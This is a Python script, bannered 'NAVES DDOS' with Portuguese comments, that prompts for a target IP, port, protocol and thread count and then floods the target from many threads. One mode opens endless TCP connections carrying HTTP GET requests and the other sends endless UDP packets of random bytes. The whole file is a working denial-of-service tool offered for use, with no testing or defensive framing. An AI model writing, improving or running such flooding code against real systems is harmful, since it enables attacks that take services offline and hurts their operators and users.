import os
import time
import socket
import random
import threading
from datetime import datetime

# Função para limpar a tela e exibir o banner
def banner():
    os.system("clear")
    os.system("figlet NAVES DDOS")
    print("\n")

# Função para exibir a barra de progresso
def progress_bar():
    os.system("clear")
    os.system("figlet Attack Starting")
    print("[                    ] 0% ")
    time.sleep(5)
    print("[=====               ] 25%")
    time.sleep(5)
    print("[==========          ] 50%")
    time.sleep(5)
    print("[===============     ] 75%")
    time.sleep(5)
    print("[====================] 100%")
    time.sleep(3)

# Função para o ataque TCP
def tcp_attack(target_ip, target_port):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))
            client.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode('ascii') + b"\r\n\r\n")
            client.close()
        except Exception as e:
            print(f"Erro na conexão TCP: {e}")

# Função para o ataque UDP
def udp_attack(target_ip, target_port, packet_size=1024):
    data = random._urandom(packet_size)
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Erro na conexão UDP: {e}")

# Função para iniciar os ataques
def start_attack(target_ip, target_port, protocol="TCP", num_threads=100, packet_size=1024):
    if protocol.upper() == "TCP":
        attack_function = tcp_attack
    elif protocol.upper() == "UDP":
        attack_function = udp_attack
    else:
        print("Protocolo não suportado! Use 'TCP' ou 'UDP'.")
        return

    threads = []
    for i in range(num_threads):
        if protocol.upper() == "UDP":
            thread = threading.Thread(target=attack_function, args=(target_ip, target_port, packet_size))
        else:
            thread = threading.Thread(target=attack_function, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Função principal
def main():
    banner()
    
    target_ip = input("IP Target : ")
    target_port = int(input("Port       : "))
    protocol = input("Protocol (TCP/UDP) : ").upper()
    num_threads = int(input("Number of Threads : "))
    packet_size = 1024
    
    if protocol == "UDP":
        packet_size = int(input("Packet Size (for UDP) : "))

    progress_bar()
    print("Ataque iniciado...")
    start_attack(target_ip, target_port, protocol, num_threads, packet_size)

if __name__ == "__main__":
    main()
